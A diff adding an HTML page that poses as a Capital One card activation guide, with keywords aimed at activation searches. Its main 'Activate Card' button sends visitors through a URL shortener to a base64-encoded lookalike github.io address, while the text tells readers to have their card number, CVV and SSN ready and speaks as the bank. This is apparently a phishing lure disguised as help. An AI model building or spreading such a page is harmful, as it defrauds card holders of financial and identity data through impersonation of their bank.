@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    How to Activate Your Capital One Card – Step-by-Step Guide</title>
+
+  <meta name="description" content="Activate your Capital One card easily with simple steps. Secure, fast, and convenient methods available online, via the app, or by phone.">
+  
+  <meta name="keywords" content="Capitalone.com/activate, Activate.capitalone.com, activation.capitalone.ca activate card,
+  capital one activating card,
+  capital one activate account,
+  capital one debit activation,
+  capital one new card activation,
+  capital one activate new card
+  ">
+  <link rel="stylesheet" href="style.css"> <!-- Link to your external CSS file -->
+
+</head>
+<body>
+
+  <!-- Header Section -->
+  <header class="header">
+    <div class="logo">
+      <img src="logo.png" alt="Logo" aria-label="Website Logo"> <!-- Replace with your logo -->
+    </div>
+    <div class="language-option">
+      <label for="language" aria-label="Choose language">Language: </label>
+      <select name="language" id="language">
+        <option value="en">English</option>
+        <option value="es">Spanish</option>
+        <option value="fr">French</option>
+      </select>
+    </div>
+  </header>
+
+  <!-- Banner Section -->
+  <div class="banner">
+    <div class="overlay"></div>
+    <div class="banner-content">
+      <h1>How to Activate Your Capital One Card – Step-by-Step Guide</h1>
+      <p>Activating your Capital One credit or debit card is quick and easy — just follow this step-by-step guide to get started using your card in minutes.</p>
+      <a href="ttps://fm.ci?aHR0cHM6Ly9jYXBpdGFsb25lY29tYWN0aXZhdGUuZ2l0aHViLmlv"><button>Activate Card in 2 Minutes</button></a>
+    </div>
+  </div>
+
+  <!-- New Content Section -->
+  <section class="content-section">
+    <center><h2>How To Activate Capital One Online?</h2></center>
+    <center><p>To activate your Capital One credit or debit card, follow these simple steps:</p></center>
+    <ol>
+      <li>
+        <strong>Visit the Official Activation Page</strong><br>
+        <ul>
+          <li>Go to the official Capital One activation page  www.capitalone.com/activate</li>
+          <li>This page is secure, and you’ll be guided through the activation process with ease.</li>
+        </ul>
+      </li>
+      <li>
+        <strong>Use the Capital One Mobile App</strong><br>
+        If you prefer using your phone, simply download and sign in to the Capital One Mobile App.<br>
+        <ul>
+          <li>Once logged in, you'll see an option to activate your new card.</li>
+          <li>The app is available for both iOS and Android devices, making it convenient to activate anytime, anywhere.</li>
+        </ul>
+      </li>
+      <li>
+        <strong>Call Customer Support for Assistance</strong><br>
+        <ul>
+          <li>You can also activate your card by phone.</li>
+          <li>Have your card details ready, including your card number and any other required verification information.</li>
+        </ul>
+      </li>
+      <li>
+        <strong>Make Sure to Have Your Card Details Ready</strong><br>
+        To complete the activation process, ensure you have the following information on hand:
+        <ul>
+          <li>Your Capital One card number</li>
+          <li>The CVV security code (on the back of your card)</li>
+          <li>Any personal verification details required (e.g., SSN, account info)</li>
+        </ul>
+      </li>
+      <li>
+        <strong>Additional Tips for a Smooth Activation</strong><br>
+        <ul>
+          <li><strong>check your email:</strong> After activation, Capital One may send a confirmation email to verify the process.</li>
+          <li><strong>Troubleshooting:</strong> If you encounter any issues, reach out to Capital One’s customer support for assistance.</li>
+        </ul>
+      </li>
+    </ol>
+  </section>
+
+  <section class="content-section">
+    <center><h2>Why Choose Capital One for Card Activation?</h2></center>
+    <ul>
+      <li><strong>Secure and Safe:</strong> Your security is our priority. All activation methods are fully encrypted to keep your information safe.</li>
+      <li><strong>Convenient:</strong> Activate your card on the go with the mobile app or simply call from home.</li>
+      <li><strong>Support Available:</strong> Capital One offers 24/7 customer support to help you with any activation issues.</li>
+    </ul>
+  </section>
+
+  <!-- FAQ Section -->
+  <section class="content-section" id="faq-section">
+    <h2>Frequently Asked Questions (FAQ)</h2>
+    <div id="faq-list">
+      <!-- FAQ items will be added here by JavaScript -->
+    </div>
+  </section>
+
+  <script>
+   fetch('faq.json')
+  .then(response => response.json())
+  .then(data => {
+    const faqList = document.getElementById('faq-list');
+
+    data.forEach(faq => {
+      const faqItem = document.createElement('div');
+      faqItem.classList.add('faq-item');
+
+      const question = document.createElement('h3');
+      question.textContent = faq.question;
+
+      const answer = document.createElement('p');
+      answer.textContent = faq.answer;
+
+      faqItem.appendChild(question);
+      faqItem.appendChild(answer);
+
+      // Add toggle functionality
+      faqItem.addEventListener('click', () => {
+        faqItem.classList.toggle('active');
+      });
+
+      faqList.appendChild(faqItem);
+    });
+  })
+  .catch(error => {
+    console.error('Error fetching FAQ data:', error);
+  });
+
+  </script>
+
+</body>
+</html>
